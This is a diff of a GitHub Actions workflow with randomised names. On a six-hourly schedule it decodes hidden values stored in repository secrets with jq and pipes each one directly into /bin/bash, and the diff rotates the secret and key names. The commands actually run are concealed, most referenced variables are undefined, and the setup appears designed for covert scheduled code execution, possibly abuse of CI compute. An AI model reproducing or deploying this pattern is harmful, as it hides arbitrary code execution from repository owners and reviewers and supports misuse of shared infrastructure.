@@ -1,28 +1,26 @@
 name: lujingxi3456
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
+    - cron: '8 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lujingxi3456
         env:
-          bvec3461: ${{ secrets.bvec3461 }}
+          pkeff0: ${{ secrets.pkeff0 }}
         run: |
-          echo $bvec3461 | jq -r .ek33 | /bin/bash
-          echo $a2 | jq -r .bszsl684 | /bin/bash
-          echo $ptist990 | jq -r .owa2 | /bin/bash
-          echo $gr31 | jq -r .jap65101 | /bin/bash
-          echo $d60675 | jq -r .u8 | /bin/bash
-          echo $cgut9 | jq -r .sftwx55322 | /bin/bash
-          echo $uhq022 | jq -r .mk687 | /bin/bash
-          echo $fqkme32271 | jq -r .unyx6 | /bin/bash
-          echo $f0318 | jq -r .fowhc0437 | /bin/bash
-          echo $kx553 | jq -r .ivpd5884 | /bin/bash
-          echo $bxo209 | jq -r .r19 | /bin/bash
-          echo $rww7821 | jq -r .uflwt12 | /bin/bash
+          echo $pkeff0 | jq -r .rhnz709 | /bin/bash
+          echo $stlrh2773 | jq -r .iqngj95299 | /bin/bash
+          echo $fahq177 | jq -r .whst026 | /bin/bash
+          echo $bbr0668 | jq -r .kstp76 | /bin/bash
+          echo $f3190 | jq -r .swc39405 | /bin/bash
+          echo $fqypr871 | jq -r .pewr39 | /bin/bash
+          echo $l0 | jq -r .tbd62 | /bin/bash
+          echo $vfw94 | jq -r .ez74625 | /bin/bash
+          echo $rqvnx4 | jq -r .amae9 | /bin/bash
+          echo $k479 | jq -r .nnu3328 | /bin/bash
 
